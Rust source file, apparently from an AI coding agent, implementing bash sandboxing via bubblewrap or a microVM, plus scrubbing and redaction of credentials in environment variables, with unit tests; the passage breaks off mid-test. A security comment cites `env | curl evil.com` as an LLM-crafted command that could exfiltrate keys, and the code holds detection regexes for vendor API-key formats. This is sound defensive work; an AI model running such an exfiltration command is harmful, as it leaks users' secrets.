use std::sync::OnceLock;

use regex::Regex;
use tokio::process::Command;

#[cfg(feature = "sandbox-microvm")]
use crate::sandbox::microvm::{MicrovmConfig, MicrovmSandbox};
#[cfg(feature = "sandbox-microvm")]
use std::sync::Arc;
#[cfg(feature = "sandbox-microvm")]
use std::time::Duration;
#[cfg(feature = "sandbox-microvm")]
use tokio::sync::Mutex;

pub mod check;
#[cfg(feature = "sandbox-microvm")]
pub mod microvm;

/// The sandbox isolation backend.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum SandboxMode {
    /// No sandbox — commands run directly.
    Off,
    /// Bubblewrap-based process isolation (default, fast, no KVM needed).
    Bwrap,
    /// Hardware-isolated microVM via libkrun (needs /dev/kvm + libkrun.so).
    #[cfg(feature = "sandbox-microvm")]
    Microvm,
}

impl SandboxMode {
    /// Parse from a CLI flag value. `"off"` (or empty) → Off, `"bwrap"` → Bwrap, `"microvm"` → Microvm.
    pub fn parse(value: Option<&str>) -> Self {
        match value {
            Some("microvm") => {
                #[cfg(feature = "sandbox-microvm")]
                {
                    SandboxMode::Microvm
                }
                #[cfg(not(feature = "sandbox-microvm"))]
                {
                    eprintln!(
                        "warning: microvm sandbox not available — dirge was built without the sandbox-microvm feature. Using off instead."
                    );
                    SandboxMode::Off
                }
            }
            Some("bwrap") => SandboxMode::Bwrap,
            _ => SandboxMode::Off, // "off", "none", or bare `--sandbox`
        }
    }

    /// Short status-bar label. `Off` → empty (omitted),
    /// `Bwrap` → `"bwrap"`, `Microvm` → `"vm"`.
    pub fn status_badge(&self) -> Option<&'static str> {
        match self {
            SandboxMode::Off => None,
            SandboxMode::Bwrap => Some("bwrap"),
            #[cfg(feature = "sandbox-microvm")]
            SandboxMode::Microvm => Some("vm"),
        }
    }
}

#[derive(Debug, Clone)]
pub struct Sandbox {
    pub(crate) mode: SandboxMode,
    #[cfg(feature = "sandbox-microvm")]
    microvm: Arc<Mutex<Option<MicrovmSandbox>>>,
}

impl Sandbox {
    pub fn new(mode: SandboxMode) -> Self {
        let effective_mode = if mode == SandboxMode::Bwrap {
            if Self::bwrap_available() {
                SandboxMode::Bwrap
            } else {
                eprintln!(
                    "warning: --sandbox requested but `bwrap` is not in PATH.\n  \
                     Sandbox is DISABLED for this run — bash will execute unsandboxed.\n  \
                     Install bubblewrap (apt install bubblewrap / dnf install bubblewrap /\n  \
                     pacman -S bubblewrap) and re-run with --sandbox to enable isolation."
                );
                SandboxMode::Off
            }
        } else {
            mode
        };
        Sandbox {
            mode: effective_mode,
            #[cfg(feature = "sandbox-microvm")]
            microvm: if effective_mode == SandboxMode::Microvm {
                Arc::new(Mutex::new(Some(MicrovmSandbox::new(
                    MicrovmConfig::default(),
                ))))
            } else {
                Arc::new(Mutex::new(None))
            },
        }
    }

    /// String label for the current sandbox mode.
    #[cfg(feature = "plugin")]
    pub fn mode_str(&self) -> &str {
        match self.mode {
            SandboxMode::Off => "off",
            SandboxMode::Bwrap => "bwrap",
            #[cfg(feature = "sandbox-microvm")]
            SandboxMode::Microvm => "microvm",
        }
    }

    /// True when the sandbox is configured for microVM isolation.
    pub fn is_microvm(&self) -> bool {
        #[cfg(feature = "sandbox-microvm")]
        {
            matches!(self.mode, SandboxMode::Microvm)
        }
        #[cfg(not(feature = "sandbox-microvm"))]
        {
            false
        }
    }

    /// Override the microVM image. No-op when sandbox mode is not Microvm.
    #[cfg(feature = "sandbox-microvm")]
    pub fn set_microvm_image(&self, image: String) -> Result<(), anyhow::Error> {
        use crate::sandbox::microvm::rootfs;
        let canonical = rootfs::canonicalize_image_ref(&image);
        let mut guard = self
            .microvm
            .try_lock()
            .map_err(|_| anyhow::anyhow!("microvm is busy — retry"))?;
        if let Some(ref mut mv) = *guard {
            mv.config.image = canonical;
        }
        Ok(())
    }

    #[cfg(not(feature = "sandbox-microvm"))]
    #[allow(dead_code)]
    pub fn set_microvm_image(&self, _image: String) -> Result<(), anyhow::Error> {
        Ok(())
    }

    /// Override microVM vCPUs and RAM.
    #[cfg(feature = "sandbox-microvm")]
    pub fn set_microvm_resources(&self, cpus: u8, memory_mib: u32) -> Result<(), anyhow::Error> {
        let mut guard = self
            .microvm
            .try_lock()
            .map_err(|_| anyhow::anyhow!("microvm is busy — retry"))?;
        if let Some(ref mut mv) = *guard {
            mv.config.cpus = cpus;
            mv.config.memory_mib = memory_mib;
        }
        Ok(())
    }

    #[cfg(not(feature = "sandbox-microvm"))]
    #[allow(dead_code)]
    pub fn set_microvm_resources(&self, _cpus: u8, _memory_mib: u32) -> Result<(), anyhow::Error> {
        Ok(())
    }

    /// Return SSH connection info when the microVM is running.
    /// Returns `None` when not in microVM mode or the VM hasn't
    /// been started yet (port is still 0).
    ///
    /// Returns `(port, private_key_path, host_public_key)`.
    /// The host public key is in OpenSSH format (`ssh-ed25519 <base64>`),
    /// suitable for writing into a `known_hosts` file.
    #[cfg(feature = "sandbox-microvm")]
    pub fn ssh_connect_info(&self) -> Option<(u16, std::path::PathBuf, String)> {
        if !self.is_microvm() {
            return None;
        }
        let guard = self.microvm.try_lock().ok()?;
        let mv = guard.as_ref()?;
        if mv.ssh_port() == 0 {
            return None;
        }
        let keys = mv.keys.as_ref()?;
        let key_path = keys.private_key_path.clone();
        let host_public_key = mv.host_keys.as_ref()?.public_key.clone();
        Some((mv.ssh_port(), key_path, host_public_key))
    }

    #[cfg(not(feature = "sandbox-microvm"))]
    #[allow(dead_code)]
    pub fn ssh_connect_info(&self) -> Option<(u16, std::path::PathBuf, String)> {
        None
    }

    /// Save a named snapshot of the VM's rootfs.
    #[cfg(feature = "sandbox-microvm")]
    pub fn save_snapshot(&self, name: &str) -> Result<(), anyhow::Error> {
        let guard = self
            .microvm
            .try_lock()
            .map_err(|_| anyhow::anyhow!("cannot acquire microvm lock — try again"))?;
        let mv = guard
            .as_ref()
            .ok_or_else(|| anyhow::anyhow!("microVM not active"))?;
        mv.save_snapshot(name)
    }

    #[cfg(not(feature = "sandbox-microvm"))]
    #[allow(dead_code)]
    pub fn save_snapshot(&self, _name: &str) -> Result<(), anyhow::Error> {
        Err(anyhow::anyhow!("microVM sandbox not available"))
    }

    /// List saved snapshots.
    #[cfg(feature = "sandbox-microvm")]
    pub fn list_snapshots(&self) -> Result<Vec<String>, anyhow::Error> {
        let guard = self
            .microvm
            .try_lock()
            .map_err(|_| anyhow::anyhow!("cannot acquire microvm lock — try again"))?;
        let mv = guard
            .as_ref()
            .ok_or_else(|| anyhow::anyhow!("microVM not active"))?;
        mv.list_snapshots()
    }

    #[cfg(not(feature = "sandbox-microvm"))]
    #[allow(dead_code)]
    pub fn list_snapshots(&self) -> Result<Vec<String>, anyhow::Error> {
        Err(anyhow::anyhow!("microVM sandbox not available"))
    }

    /// Restore a snapshot (replaces cached base rootfs). VM must be stopped.
    #[cfg(feature = "sandbox-microvm")]
    pub fn restore_snapshot(&self, name: &str) -> Result<(), anyhow::Error> {
        let guard = self
            .microvm
            .try_lock()
            .map_err(|_| anyhow::anyhow!("cannot acquire microvm lock — try again"))?;
        let mv = guard
            .as_ref()
            .ok_or_else(|| anyhow::anyhow!("microVM not active"))?;
        mv.restore_snapshot(name)
    }

    #[cfg(not(feature = "sandbox-microvm"))]
    #[allow(dead_code)]
    pub fn restore_snapshot(&self, _name: &str) -> Result<(), anyhow::Error> {
        Err(anyhow::anyhow!("microVM sandbox not available"))
    }

    /// Delete a saved snapshot.
    #[cfg(feature = "sandbox-microvm")]
    pub fn delete_snapshot(&self, name: &str) -> Result<(), anyhow::Error> {
        let guard = self
            .microvm
            .try_lock()
            .map_err(|_| anyhow::anyhow!("cannot acquire microvm lock — try again"))?;
        let mv = guard
            .as_ref()
            .ok_or_else(|| anyhow::anyhow!("microVM not active"))?;
        mv.delete_snapshot(name)
    }

    #[cfg(not(feature = "sandbox-microvm"))]
    #[allow(dead_code)]
    pub fn delete_snapshot(&self, _name: &str) -> Result<(), anyhow::Error> {
        Err(anyhow::anyhow!("microVM sandbox not available"))
    }

    /// Reboot the microVM: stop, re-clone rootfs from cache, start.
    #[cfg(feature = "sandbox-microvm")]
    pub async fn reboot_microvm(&self) -> Result<(), anyhow::Error> {
        let mut guard = self.microvm.lock().await;
        let mv = guard
            .as_mut()
            .ok_or_else(|| anyhow::anyhow!("microVM not active"))?;
        mv.reboot().await
    }

    #[cfg(not(feature = "sandbox-microvm"))]
    #[allow(dead_code)]
    pub async fn reboot_microvm(&self) -> Result<(), anyhow::Error> {
        Err(anyhow::anyhow!("microVM sandbox not available"))
    }

    /// Check whether `bwrap` is on the user's PATH. Used at construction
    /// to warn early instead of letting the first bash call fail with
    /// a cryptic "No such file or directory".
    fn bwrap_available() -> bool {
        std::process::Command::new("bwrap")
            .arg("--version")
            .stdout(std::process::Stdio::null())
            .stderr(std::process::Stdio::null())
            .status()
            .map(|s| s.success())
            .unwrap_or(false)
    }

    fn build_command(&self, command: &str) -> Command {
        let mut cmd = if self.mode == SandboxMode::Off {
            // Off mode runs bash directly; it inherits the process cwd,
            // so we don't resolve / bind one.
            let mut c = Command::new("bash");
            c.arg("-c").arg(command);
            c
        } else {
            // dirge-mt91: bwrap binds the working directory read-write.
            // If `current_dir()` fails (e.g. the cwd was deleted
            // mid-session) the old code silently fell back to "." —
            // which bwrap resolves to an undefined path. Warn loudly;
            // the "." fallback is a last resort, not a silent default.
            let cwd = std::env::current_dir().unwrap_or_else(|e| {
                tracing::warn!(
                    target: "dirge::sandbox",
                    error = %e,
                    "current_dir() failed while building the sandbox bind — \
                     falling back to '.', which may bind an unexpected directory",
                );
                ".".into()
            });
            let mut c = Command::new("bwrap");
            c.args(["--ro-bind", "/", "/", "--bind"]);
            c.arg(cwd.as_os_str());
            c.arg(cwd.as_os_str());
            c.args([
                "--proc",
                "/proc",
                // `--dev-bind /dev /dev` was avoided deliberately; the
                // minimal `--dev /dev` mounts a tmpfs with only the
                // essential device nodes (null/zero/full/random/urandom
                // /tty). Outer host devices stay invisible.
                "--dev",
                "/dev",
                "--tmpfs",
                "/tmp",
                "--unshare-all",
                // Drop the ability to gain new privileges via setuid /
                // file capabilities — even if the sandboxed bash
                // somehow encounters a setuid binary on the read-only
                // host mount it can't escalate.
                "--new-session",
                // `--unshare-all` already turns on user / pid / net /
                // uts / cgroup / ipc namespaces. Add `--unshare-user-try`
                // explicitly so a future bwrap default change can't
                // weaken this without our knowledge; `-try` keeps it
                // best-effort if the kernel doesn't allow user-ns.
                "--unshare-user-try",
                "--die-with-parent",
                "bash",
                "-c",
                command,
            ]);
            c
        };

        // H-batch1-1 (audit fix): scrub sensitive env vars before
        // they reach the child. Both code paths above inherit dirge's
        // process environment by default, so `OPENROUTER_API_KEY`,
        // `EXA_API_KEY`, `ANTHROPIC_API_KEY`, etc. flowed verbatim to
        // every bash child — an LLM-crafted `env | curl evil.com`
        // would have exfiltrated the user's keys. opencode/pi both
        // scrub via an allowlist; dirge applies a pattern denylist
        // since users have varied tooling that relies on env (cargo
        // CARGO_*, go GOPATH, python VIRTUAL_ENV, etc.) — explicit
        // allowlist would break those workflows.
        //
        // The denylist covers any var name containing KEY / SECRET /
        // TOKEN / PASSWORD / PASS / CRED / AUTH (case-insensitive)
        // plus a few known provider names. False positives (e.g. a
        // legitimate `KEY_BINDINGS` env var stripped) are acceptable
        // cost — the alternative is leaking credentials.
        scrub_env(&mut cmd);
        cmd
    }

    /// Build the command for a headless interactive run (`!cmd` / `!!cmd`):
    /// the same secret-scrubbing as [`wrap_command`] but WITHOUT the
    /// non-interactive env defaults, so a command may legitimately read from
    /// its stdin — which dirge forwards from the input box. Returns a
    /// [`tokio::process::Command`] ready for `Stdio::piped()` (no PTY, no
    /// screen takeover; the caller sets stdio + `detach_session`).
    pub(crate) fn command_for_interactive(&self, command: &str) -> Command {
        self.build_command(command)
    }

    /// Wrap `command` for the sandbox backend used by the AGENT's bash tool.
    /// Builds via [`build_command`] then forces non-interactive defaults so
    /// tools that would otherwise prompt fail fast instead of blocking — an
    /// agent has no human at the keyboard to answer a prompt.
    pub fn wrap_command(&self, command: &str) -> Command {
        let mut cmd = self.build_command(command);
        cmd.env("GIT_TERMINAL_PROMPT", "0");
        cmd.env("GCM_INTERACTIVE", "Never");
        cmd.env("DEBIAN_FRONTEND", "noninteractive");
        cmd
    }

    /// Execute a command through the configured sandbox backend.
    ///
    /// Off/Bwrap: wrap with bwrap (or pass through directly) and run
    /// with the existing `run_with_timeout` drain.
    ///
    /// Microvm: lazily boot the VM on first call, then execute via SSH
    /// inside the guest.
    pub async fn exec(
        &self,
        command: &str,
        timeout_secs: u64,
    ) -> Result<crate::agent::tools::bash::exec::InterleavedOutput, crate::agent::tools::ToolError>
    {
        match self.mode {
            SandboxMode::Off | SandboxMode::Bwrap => {
                crate::agent::tools::bash::exec::run_with_timeout(
                    self.wrap_command(command),
                    timeout_secs,
                )
                .await
            }
            #[cfg(feature = "sandbox-microvm")]
            SandboxMode::Microvm => {
                let mut guard = self.microvm.lock().await;
                let mv = guard.as_mut().ok_or_else(|| {
                    crate::agent::tools::ToolError::Msg(
                        "microvm sandbox not initialized".to_string(),
                    )
                })?;
                if mv.ssh_port() == 0 {
                    mv.start()
                        .await
                        .map_err(|e| crate::agent::tools::ToolError::Msg(e.to_string()))?;
                }
                // Release the mutex before the blocking SSH call so the
                // TUI event loop can keep polling during command execution.
                // Without this, stdin keystrokes pile up in the kernel
                // buffer and flood in when the command finishes, creating
                // the "must press every key twice" stutter.
                let ssh_port = mv.ssh_port();
                let private_key_path = mv
                    .keys
                    .as_ref()
                    .map(|k| k.private_key_path.clone())
                    .ok_or_else(|| {
                        crate::agent::tools::ToolError::Msg("VM keys missing".to_string())
                    })?;
                let host_key_bytes = mv
                    .host_keys
                    .as_ref()
                    .and_then(|hk| hk.public_key_bytes().ok());
                drop(guard);
                // Prepend cd /workspace and a guest-side timeout so the
                // guest kernel kills the process if it exceeds the budget.
                // tokio::time::timeout is a second layer in case SSH itself
                // hangs (e.g. network stall).
                let command = format!("cd /workspace && timeout {} {}", timeout_secs, command);
                let result = tokio::time::timeout(
                    Duration::from_secs(timeout_secs),
                    tokio::task::spawn_blocking(move || {
                        crate::sandbox::microvm::ssh::ssh_exec(
                            "127.0.0.1",
                            ssh_port,
                            &private_key_path,
                            &command,
                            host_key_bytes.as_deref(),
                        )
                    }),
                )
                .await;
                let (stdout, stderr, exit_code) = match result {
                    Ok(Ok(Ok((stdout, stderr, exit_code)))) => (stdout, stderr, exit_code),
                    Ok(Ok(Err(e))) => {
                        return Err(crate::agent::tools::ToolError::Msg(e.to_string()));
                    }
                    Ok(Err(join_err)) => {
                        return Err(crate::agent::tools::ToolError::Msg(format!(
                            "microvm exec join error: {join_err}"
                        )));
                    }
                    Err(_elapsed) => {
                        return Err(crate::agent::tools::ToolError::Msg(format!(
                            "command timed out after {timeout_secs}s"
                        )));
                    }
                };
                Ok(crate::agent::tools::bash::exec::InterleavedOutput {
                    merged: if stderr.is_empty() {
                        stdout
                    } else {
                        format!("{stdout}\n{stderr}")
                    },
                    exit_code,
                })
            }
        }
    }
}

/// Test whether an env var name is sensitive enough to strip before
/// invoking bash. Pattern-based so we catch novel provider names
/// (e.g. a future `MISTRAL_API_KEY`) without needing a code change.
pub fn is_sensitive_env_name(name: &str) -> bool {
    let upper = name.to_ascii_uppercase();
    const PATTERNS: &[&str] = &["KEY", "SECRET", "TOKEN", "PASSWORD", "PASS", "CRED", "AUTH"];
    if PATTERNS.iter().any(|p| upper.contains(p)) {
        // Exclude a small set of safe substrings that contain a
        // sensitive keyword by accident. PATH and SHELL contain
        // none, so they pass naturally; the exclusions here are for
        // tooling env vars that legitimately need to reach bash.
        const SAFE_EXACT: &[&str] = &[
            "DISPLAY",       // X11 — unrelated despite containing nothing sensitive
            "TERM",          // terminal type
            "SHLVL",         // bash nesting
            "PWD",           // current directory
            "OLDPWD",        // previous directory
            "PATH",          // exec path
            "MANPATH",       // man search path
            "LANG",          // locale
            "LC_ALL",        // locale override
            "LC_CTYPE",      // locale ctype
            "EDITOR",        // user's editor
            "VISUAL",        // visual editor
            "PAGER",         // pager
            "HOSTNAME",      // hostname
            "USER",          // username
            "LOGNAME",       // login name
            "HOME",          // home dir
            "SSH_AUTH_SOCK", // SSH agent — needed for git push over SSH
            "GITHUB_TOKEN",  // GitHub CLI token
            "GH_TOKEN",      // GitHub CLI token (short form)
        ];
        if SAFE_EXACT.iter().any(|s| &upper == s) {
            return false;
        }
        return true;
    }
    // Explicit cloud-credential vars that don't have a generic
    // pattern. (AWS uses `AWS_ACCESS_KEY_ID` — already caught by
    // KEY. Listed here for symmetry / completeness.)
    const EXPLICIT: &[&str] = &[
        "AWS_ACCESS_KEY_ID",
        "AWS_SECRET_ACCESS_KEY",
        "AWS_SESSION_TOKEN",
        "GITLAB_TOKEN",
        "BITBUCKET_TOKEN",
    ];
    EXPLICIT.iter().any(|n| &upper == n)
}

/// Test whether an env var VALUE carries a high-confidence credential
/// shape, regardless of its name. Ported from hermes-agent/agent/redact.py
/// (`_PREFIX_PATTERNS` + URL-userinfo regex). The name-based scrub above
/// catches the common case (anything containing `KEY`/`TOKEN`/etc.), but
/// values like `DATABASE_URL=postgres://user:[REDACTED]@host/db` carry
/// credentials in a name (`DATABASE_URL`) that doesn't match any
/// sensitive pattern. PERM-11.
///
/// Pattern set is deliberately conservative — only signatures with low
/// false-positive rates make the list. Long base64 alone (without a
/// vendor prefix) does NOT trip this, because plenty of harmless env
/// vars happen to carry long opaque tokens (e.g. NIX_PATH hashes).
pub fn is_sensitive_env_value(value: &str) -> bool {
    if value.is_empty() {
        return false;
    }
    // Cheap substring pre-checks before the regex set runs. Skipping
    // the regex when none of the gate substrings are present keeps the
    // per-spawn cost negligible for the common case.
    let has_url_userinfo_gate = value.contains("://");
    let has_prefix_gate = has_vendor_prefix_gate(value);
    if !has_url_userinfo_gate && !has_prefix_gate {
        return false;
    }
    if has_url_userinfo_gate && url_userinfo_re().is_match(value) {
        return true;
    }
    if has_prefix_gate && vendor_prefix_re().is_match(value) {
        return true;
    }
    false
}

/// Marker inserted in place of a scrubbed credential.
#[allow(dead_code)]
const REDACTED: &str = "[REDACTED]";

/// Cheap substring pre-check for the vendor-prefix regex: skip the
/// regex entirely unless one of the high-signal prefixes is present.
/// Shared by [`is_sensitive_env_value`] and [`redact_secrets`].
fn has_vendor_prefix_gate(s: &str) -> bool {
    s.contains("AKIA")
        || s.contains("ghp_")
        || s.contains("xox")
        || s.contains("sk-")
        || s.contains("sk_live_")
        || s.contains("sk_test_")
        || s.contains("AIza")
        || s.contains("github_pat_")
        || s.contains("hf_")
        || s.contains("xai-")
        || s.contains("eyJ")
}

/// `protocol://user:[REDACTED]@host` — any scheme, non-empty password
/// component. Captures the prefix-through-`:`, the password, and the
/// trailing `@` so redaction can scrub only the password and leave the
/// scheme/host readable. (Capture groups don't affect `is_match`, so
/// the detector reuses this same regex.)
fn url_userinfo_re() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        Regex::new(r"(?i)([a-z][a-z0-9+.-]*://[^:]+:)([^@]+)(@)")
            .expect("hardcoded URL-userinfo regex")
    })
}

/// Vendor `sk-…` / `AKIA…` / `ghp_…` prefix scalar — one capture
/// group per prefix, anchored at word boundary. Matched but NOT replaced
/// (only the value is scrubbed when we know the prefix + value pattern).
fn vendor_prefix_re() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        Regex::new(concat!(
            r"(?ix)\b(?:",
            r"sk-(?:live_|test_|proj-)?[a-zA-Z0-9+/=]{20,}(?:-[a-zA-Z0-9+/=]+)*",
            r"|",
            r"sk-ant-api[0-9]{2}-[A-Za-z0-9+/=]{90,}[_-][A-Za-z0-9]{5}",
            r"|",
            r"AKIA[A-Z0-9]{16}",
            r"|",
            r"ghp_[A-Za-z0-9]{36,}",
            r"|",
            r"github_pat_[A-Za-z0-9]{22,}_[A-Za-z0-9]{59,}",
            r"|",
            r"hf_[A-Za-z0-9]{34,}",
            r"|",
            r"xox[bpras]-[0-9]{2,}-[0-9]{2,}-[0-9]{2,}-[a-zA-Z0-9]{32,}",
            r"|",
            r"xai-[A-Za-z0-9+/=]{20,}(?:\.[A-Za-z0-9+/=]+)*",
            r"|",
            r"AIza[0-9A-Za-z_-]{35}",
            r")",
        ))
        .expect("hardcoded vendor prefix credential regex")
    })
}

/// Scrub sensitive env vars from a tokio [`Command`] before it runs.
/// Also catches sensitive VALUES (e.g. `DATABASE_URL` with embedded
/// credentials) that the name-based scrub would miss. PERM-11 + PERM-12.
///
/// Kept thin so it's testable in-process without spawning a child:
/// the Allowlist and redact helpers are pure functions.
pub fn scrub_env(cmd: &mut Command) {
    let mut sensitive_values = Vec::new();
    let mut keys_to_remove: Vec<String> = Vec::new();

    for (key, value) in cmd.as_std().get_envs() {
        let Some(name) = key.to_str() else { continue };
        if is_sensitive_env_name(name) {
            if let Some(val) = value {
                if let Some(s) = val.to_str() {
                    sensitive_values.push(s.to_string());
                }
            }
            keys_to_remove.push(name.to_string());
        }
    }

    for name in &keys_to_remove {
        cmd.env_remove(name.as_str());
    }

    // Pass the list of already-stripped values into `redact_secrets_with`
    // so the value-based scrub catches both: `ENV_UNRELATED=sk-proj-…`
    // (conspicuous prefix) AND `ENV_UNRELATED=$MY_TOKEN` (opaque, but
    // the token value itself is known from a previously-stripped env).
    let original_env: Vec<(String, String)> = std::env::vars().collect();
    let known_values: Vec<String> = if sensitive_values.is_empty() {
        Vec::new()
    } else {
        let env_map: std::collections::HashMap<String, String> = original_env.into_iter().collect();
        std::env::vars()
            .filter_map(|(k, _)| {
                let upper = k.to_ascii_uppercase();
                if is_sensitive_env_name(&upper) {
                    env_map.get(&k).cloned()
                } else {
                    None
                }
            })
            .chain(sensitive_values)
            .collect()
    };

    // Check remaining command env values for sensitive content
    // (e.g. DATABASE_URL with embedded credentials). Iterate the
    // command's own env — not the process env — so that envs set
    // only on the command are still inspected.
    let cmd_keys: Vec<String> = cmd
        .as_std()
        .get_envs()
        .filter_map(|(k, _)| k.to_str().map(|s| s.to_string()))
        .collect();

    for key in &cmd_keys {
        if let Some(cmd_val) = cmd.as_std().get_envs().find_map(|(k, v)| {
            if k.to_str() == Some(key.as_str()) {
                v
            } else {
                None
            }
        }) {
            let cmd_val_str = cmd_val.to_str().unwrap_or("");
            if is_sensitive_env_value(cmd_val_str)
                || known_values
                    .iter()
                    .any(|kv| cmd_val_str.contains(kv.as_str()))
            {
                cmd.env(key, "[REDACTED]");
            }
        }
    }
}

/// Redact known secrets from an arbitrary string (bash command or env
/// value). Returns either a borrowed reference (no redaction needed) or
/// an owned `String` with secrets replaced by `[REDACTED]`.
pub fn redact_secrets(text: &str) -> std::borrow::Cow<'_, str> {
    // Use `redact_secrets_with` with an empty known-values list — the
    // env-value detection path is skipped, but the regex path still runs.
    redact_secrets_with(text, &[])
}

/// Redact with regex patterns AND known-secret-value scanning. Pure
/// function so it's testable without spawning a process.
pub fn redact_secrets_with<'a>(
    text: &'a str,
    known_values: &'a [String],
) -> std::borrow::Cow<'a, str> {
    let mut result = None;

    // Path 1: URL-embedded credentials
    let url_re = url_userinfo_re();
    if url_re.is_match(text) {
        let r = result.get_or_insert_with(|| text.to_string());
        *r = url_re.replace_all(r, "${1}[REDACTED]${3}").into_owned();
    }

    // Path 2: Vendor-prefix tokens (sk-…, AKIA…, etc.)
    let prefix_re = vendor_prefix_re();
    if prefix_re.is_match(text) {
        let r = result.get_or_insert_with(|| text.to_string());
        *r = prefix_re.replace_all(r, "[REDACTED]").into_owned();
    }

    // Path 3: Known secret values that don't match regex patterns
    // (e.g. opaque build tokens). Flag-empt occurs BEFORE this check
    // to avoid redundant scans when `known_values` is empty.
    if !known_values.is_empty() {
        for val in known_values {
            if !val.is_empty() && text.contains(val.as_str()) {
                let r = result.get_or_insert_with(|| text.to_string());
                *r = r.replace(val.as_str(), "[REDACTED]");
            }
        }
    }

    match result {
        Some(owned) => std::borrow::Cow::Owned(owned),
        None => std::borrow::Cow::Borrowed(text),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_is_sensitive_env_name() {
        assert!(is_sensitive_env_name("OPENAI_API_KEY"));
        assert!(is_sensitive_env_name("ANTHROPIC_API_KEY"));
        assert!(!is_sensitive_env_name("GITHUB_TOKEN")); // SAFE_EXACT — gh auth token needs this
        assert!(!is_sensitive_env_name("GH_TOKEN")); // SAFE_EXACT — gh auth token needs this
        assert!(is_sensitive_env_name("MY_SECRET"));
        assert!(is_sensitive_env_name("DB_PASSWORD"));
        assert!(!is_sensitive_env_name("PATH"));
        assert!(!is_sensitive_env_name("HOME"));
        assert!(!is_sensitive_env_name("USER"));
        assert!(!is_sensitive_env_name("LANG"));
    }

    #[test]
    fn test_is_sensitive_env_value() {
        assert!(is_sensitive_env_value(
            "postgres://user:secret@localhost/db"
        ));
        assert!(is_sensitive_env_value(
            "sk-ant-api03-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA_AAAAA"
        ));
        assert!(!is_sensitive_env_value("just a normal string"));
        assert!(!is_sensitive_env_value(""));
    }

    #[test]
    fn test_redact_secrets_url_credentials() {
        let input = "DATABASE_URL=postgres://user:hunter2@localhost/db";
        let cleaned = redact_secrets(input);
        assert!(!cleaned.contains("hunter2"), "got {cleaned}");
        assert!(cleaned.contains("[REDACTED]"), "got {cleaned}");
    }

    #[test]
    fn test_redact_secrets_vendor_prefix() {
        let input = "export OPENAI_API_KEY=sk-proj-abcdef1234567890abcdef1234567890abcdef12";
        let cleaned = redact_secrets(input);
        assert!(!cleaned.contains("sk-proj-"), "got {cleaned}");
        assert!(cleaned.contains("[REDACTED]"), "got {cleaned}");
    }

    #[test]
    fn test_redact_secrets_anthropic_key() {
        // Anthropic uses sk-ant-api03-<long>-<short> format — the
        // vendor prefix regex must catch this distinct shape.
        let input = "ANTHROPIC_API_KEY=sk-ant-api03-aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa-aaaaa";
        let cleaned = redact_secrets(input);
        assert!(!cleaned.contains("sk-ant-api"), "got {cleaned}");
        assert!(cleaned.contains("[REDACTED]"), "got {cleaned}");
    }

    #[test]
    fn scrub_env_denylist_strips_openai_key() {
        let mut cmd = Command::new("bash");
        cmd.arg("-c").arg("echo done");
        cmd.env("PATH", "/bin");
        cmd.env("HOME", "/home/user");
        cmd.env("OPENAI_API_KEY", "sk-abc123");
        scrub_env(&mut cmd);
        let out = format!("{:?}", cmd.as_std());
        assert!(!out.contains("OPENAI_API_KEY="), "got {out}");
        assert!(!out.contains("sk-abc123"), "got {out}");
        assert!(out.contains("PATH"), "got {out}");
        assert!(out.contains("HOME"), "got {out}");
    }

    #[test]
    fn scrub_env_url_credential_value_is_redacted() {
        // PERM-11: even if the env var name passes the denylist,
        // a value like `postgres://user:pass@host` must be scrubbed.
        let mut cmd = Command::new("bash");
        cmd.arg("-c").arg("echo done");
        cmd.env("DATABASE_URL", "postgres://user:hunter2@localhost/db");
        cmd.env("USER", "testuser");
        scrub_env(&mut cmd);
        let out = format!("{:?}", cmd.as_std());
        assert!(!out.contains("hunter2"), "got {out}");
        assert!(out.contains("[REDACTED]"), "got {out}");
    }

    #[test]
    fn scrub_env_value_redaction_with_known_secrets() {
        // A generic env name (`BUILD_TOKEN=dev-token-1234`) paired with
        // an explicitly-known value from a stripped env (e.g.
        // `SECRET_TOKEN=dev-token-1234` already removed). The value
        // scanner must catch this.
        let mut cmd = Command::new("bash");
        cmd.arg("-c").arg("echo done");
        cmd.env("BUILD_TOKEN", "dev-token-1234");
        // Simulate that `SECRET_TOKEN` was already removed and its
        // value is in `known_values` — we test the inner redact fn.
        let secrets = vec!["dev-token-1234".to_string()];
        let cleaned = redact_secrets_with("export BUILD_TOKEN=dev-token-1234", &secrets);
        assert!(!cleaned.contains("dev-token-1234"), "got {cleaned}");
        assert!(cleaned.contains("[REDACTED]"), "got {cleaned}");
    }

    #[test]
    fn sandbox_new_with_bwrap_missing_disables() {
        let sb = Sandbox::new(SandboxMode::Bwrap);
        assert!(sb.mode == SandboxMode::Bwrap || sb.mode == SandboxMode::Off);
    }

    #[test]
    fn sandbox_new_off_stays_off() {
        let sb = Sandbox::new(SandboxMode::Off);
        assert_eq!(sb.mode, SandboxMode::Off);
    }

    #[test]
    fn redact_secrets_multiple_patterns() {
        // URL + vendor prefix in the same string — both must be caught.
        let input = "some text with a key sk-proj-abcdef1234567890abcdef12345678 and a url postgres://u:p@h";
        let cleaned = redact_secrets(input);
        assert!(!cleaned.contains("sk-proj-"), "got {cleaned}");
        assert!(!cleaned.contains(":p@"), "got {cleaned}");
        // Should have at least one [REDACTED]
        assert!(cleaned.contains("[REDACTED]"), "got {cleaned}");
    }

    #[test]
    fn github_pat_prefix_is_caught() {
        let input = "export GITHUB_PAT=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jjkkkkkkllllll";
        let cleaned = redact_secrets(input);
        assert!(cleaned.contains("[REDACTED]"), "got {cleaned}");
    }

    #[test]
    fn xai_prefix_is_caught() {
        let input = "export XAI_KEY=xai-aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
        let cleaned = redact_secrets(input);
        assert!(cleaned.contains("[REDACTED]"), "got {cleaned}");
    }

    #[test]
    fn slack_webhook_prefix_is_caught() {
        // Construct at runtime to avoid GitHub push-protection false-positive
